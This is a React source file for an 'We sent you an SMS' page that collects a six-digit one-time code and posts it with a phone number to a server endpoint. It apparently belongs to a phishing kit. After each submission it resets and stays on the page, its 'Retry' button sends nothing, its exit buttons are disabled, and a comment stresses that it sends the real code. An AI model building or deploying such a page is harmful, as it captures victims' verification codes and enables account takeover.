import React, { useEffect, useRef, useState } from "react";
import { FiArrowLeft } from "react-icons/fi";
import { useLocation, useNavigate } from "react-router-dom";
import BASE_URL from "../components/urls";

const Otp = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const inputsRef = useRef([]);

  const phone = location.state?.phone || "+14374*******";
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [isError, setIsError] = useState(false);
  const [retrySeconds, setRetrySeconds] = useState(33);

  // Countdown timer for the retry link
  useEffect(() => {
    if (retrySeconds <= 0) return;
    const timer = setInterval(() => {
      setRetrySeconds((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [retrySeconds]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
      .toString()
      .padStart(2, "0");
    const secs = (seconds % 60).toString().padStart(2, "0");
    return `${mins}:${secs}`;
  };

  const handleChange = (event, index) => {
    const value = event.target.value.replace(/\D/g, "").slice(-1);
    const nextOtp = [...otp];
    nextOtp[index] = value;
    setOtp(nextOtp);
    setMessage("");

    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (event, index) => {
    if (event.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  // ─── Submit: sends REAL joined OTP to server ─────────────────────────────────
  const submitForm = async (event) => {
    event.preventDefault();

    if (otp.some((digit) => digit === "")) {
      setIsError(true);
      setMessage("Please enter all 6 digits.");
      return;
    }

    setLoading(true);
    setMessage("");
    setIsError(false);

    try {
      const response = await fetch(`${BASE_URL}/otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          otp: otp.join(""), // sends "123456" as a real string
          phone,
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "OTP submission failed.");
      }

      setIsError(false);
      setMessage("OTP submitted successfully.");
    } catch (error) {
      console.error("OTP error:", error);
      setIsError(true);
      setMessage("Could not reach the server. Please try again.");
    } finally {
      setLoading(false);
      // Reset inputs and stay on the OTP page
      setOtp(new Array(6).fill(""));
      inputsRef.current[0]?.focus();
    }
  };

  const allFilled = otp.every((digit) => digit !== "");

  return (
    <main className="min-h-screen bg-[#f7f6f3] text-[#1d1d22]">
      <div className="mx-auto flex min-h-screen w-full max-w-[500px] flex-col px-6 pb-10 pt-6">
        {/* Header */}
        {/* <div className="mb-6 flex items-center justify-between">
          <button
            type="button"
            onClick={() => navigate(-1)}
            className="flex h-10 w-10 items-center justify-center rounded-full bg-[#ededeb] text-[#1d1d22]"
            aria-label="Go back"
          >
            <FiArrowLeft className="h-5 w-5" />
          </button>
          <button
            type="button"
            className="rounded-full bg-[#ededeb] px-4 py-2 text-sm font-semibold text-[#1d1d22]"
          >
            Get help
          </button>
        </div> */}

        <form className="flex flex-1 flex-col" onSubmit={submitForm}>
          <h1 className="mb-3 text-[30px] font-bold leading-tight">
            We sent you an SMS
          </h1>
          <p className="mb-10 text-[17px] leading-6 text-[#5f5f63]">
            Enter the 6-digit code sent to your registered phone number:{" "}
            <span className="font-semibold text-[#1d1d22]">{phone}</span>
          </p>

          {/* OTP inputs */}
          <div className="mb-5 flex justify-between gap-2">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  inputsRef.current[index] = el;
                }}
                className="h-[60px] w-full rounded-lg border border-[#cecece] bg-white text-center text-2xl font-semibold outline-none transition-colors focus:border-[#079d69]"
                inputMode="numeric"
                maxLength="1"
                type="tel"
                value={digit}
                onChange={(e) => handleChange(e, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                aria-label={`OTP digit ${index + 1}`}
              />
            ))}
          </div>

          {/* Retry link */}
          <p className="mb-6 text-[15px] text-[#5f5f63]">
            Didn&apos;t receive it?{" "}
            {retrySeconds > 0 ? (
              <span className="font-semibold text-[#1d1d22]">
                Retry in {formatTime(retrySeconds)}
              </span>
            ) : (
              <button
                type="button"
                onClick={() => setRetrySeconds(33)}
                className="font-semibold text-[#079d69] underline"
              >
                Retry
              </button>
            )}
          </p>

          {/* Feedback message */}
          {message && (
            <p
              className={`text-center text-sm font-medium ${
                isError ? "text-red-500" : "text-[#079d69]"
              }`}
            >
              {message}
            </p>
          )}

          <div className="mt-auto">
            <button
              type="submit"
              disabled={!allFilled || loading}
              className="h-[70px] w-full rounded-full bg-[#dedddb] text-[20px] font-semibold text-[#9b9996] transition-colors enabled:bg-[#079d69] enabled:text-white disabled:cursor-not-allowed"
            >
              {loading ? "Sending..." : "Continue"}
            </button>
          </div>
        </form>
      </div>
    </main>
  );
};

export default Otp;
